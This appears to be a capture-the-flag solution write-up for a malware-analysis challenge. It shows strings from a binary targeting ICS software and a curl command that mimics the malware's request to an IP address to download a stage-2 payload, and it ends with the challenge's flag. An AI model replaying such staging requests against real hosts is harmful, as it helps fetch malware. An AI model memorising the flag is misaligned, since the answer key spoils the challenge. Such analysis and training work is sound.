Intended solve:

- Running `strings` against the binary reveals the following functionality:
    - Reconnaissance: Checks for specific paths related to ICS software
    - Payload staging via HTTP: Imports sed

```
WinHttpConnect
WinHttpSendRequest
WinHttpCloseHandle
WinHttpOpenRequest
WinHttpQueryHeaders
WinHttpAddRequestHeaders
WinHttpOpen
WinHttpReceiveResponse
WINHTTP.dll
...
C:\Program Files (x86)\Proficy\Proficy CIMPLICITY
C:\Program Files\Proficy\Proficy CIMPLICITY
GET
```

- Additional strings give hints at campaign coding to download a stage 2 payload from an IP:

```
13.60.135.243
Arrakis/0.2
Stage2: GreenWillow.iso
```

- Opening in disassembler will confirm `WinHttpOpen` and `WinHttpAddRequestHeaders` use the above strings as the User-Agent and custom header, respectively
- Replicating the HTTP request to the IP `13.60.135.243` in the headers (following redirects)
- Example command for flag: 

```console
$ curl -vL -A "Arrakis/0.2" -H "Stage2: GreenWillow.iso" http://13.60.135.243
```

- Flag: `flag{gru_74455_b4ck_4t_1t_aga1n_37a6d}`
